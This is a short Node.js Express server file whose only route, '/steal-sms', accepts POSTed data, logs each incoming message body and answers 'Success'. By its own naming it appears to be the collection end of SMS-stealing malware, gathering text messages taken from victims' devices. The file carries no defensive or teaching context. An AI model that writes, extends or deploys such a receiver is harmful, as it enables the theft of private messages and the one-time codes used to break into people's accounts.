const express = require('express');
const app = express();
app.use(express.json());

app.post('/steal-sms', (req, res) => {
    console.log("New message received: ", req.body);
    res.send("Success");
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});